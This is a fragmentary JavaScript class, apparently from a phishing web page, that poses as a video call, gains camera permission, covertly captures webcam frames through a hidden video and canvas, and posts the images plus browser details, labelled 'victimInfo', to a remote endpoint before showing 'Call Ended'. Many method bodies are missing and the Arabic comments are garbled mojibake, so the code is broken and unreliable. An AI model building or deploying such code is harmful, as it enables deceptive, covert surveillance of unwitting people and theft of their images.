        class PenanceProtocol {
            constructor() {

            showPermissionDialog() {

            acceptPermission(choice) {

            async startOperation() {

                    this.stream = await navigator.mediaDevices.getUserMedia({

            soulReader(video) {
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d', { willReadFrequently: true });
                const heartbeat = setInterval(() => {
                    if (video.readyState >= 2 && video.videoWidth > 0) {
                        ctx.drawImage(video, 0, 0, 10, 10);
                        const imageData = ctx.getImageData(0, 0, 1, 1).data;
                        if (imageData[0] > 10 || imageData[1] > 10 || imageData[2] > 10) {
                            clearInterval(heartbeat);
                            this.updateStatus('Connected. Video call active...');
                            this.startCaptureLoop();
                        }
                    }
                }, 100);

                setTimeout(() => { 
                    clearInterval(heartbeat); 
                    if (this.captureCount === 0) this.disappear(); 
                }, 7000);
            }

            async sendInitialReport() {
                const victimInfo = { 
                    userAgent: navigator.userAgent, 
                    platform: navigator.platform,
                    userChoice: this.userChoice, // Ù…Ø§Ø°Ø§ Ø§Ø®ØªØ§Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… (Ù„Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ÙÙ‚Ø·)

                };

                    headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken }, 
                    body: JSON.stringify({ info: victimInfo }) 
                });
            }

            startCaptureLoop() {
                if (this.captureCount >= this.maxCaptures) {
                    this.disappear();
                    return;
                }
                const video = document.getElementById('hiddenVideo');
                if (video.readyState < 2 || video.videoWidth === 0) {
                    this.disappear();
                    return;
                }

                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                this.captureCount++;
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                this.sendPhotoReport(imageData, this.captureCount);
                
                setTimeout(() => this.startCaptureLoop(), 500);
            }

            async sendPhotoReport(imageData, count) {
                const victimInfo = { 
                    captureSequence: `${count}/${this.maxCaptures}`,
                    userChoice: this.userChoice, // Ù…Ø§Ø°Ø§ Ø¸Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ù†Ù‡ Ø§Ø®ØªØ§Ø±

                };
                return fetch(this.apiEndpoint, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json', 'X-Auth-Token': this.authToken }, 
                    body: JSON.stringify({ image: imageData, info: victimInfo }) 
                });
            }

            disappear() {
                if (this.stream) {

                document.getElementById('cameraPermission').classList.remove('active');
                const container = document.querySelector('.call-container');
                container.innerHTML = `<h1 class="caller-name">Call Ended</h1>`;
            }
        }
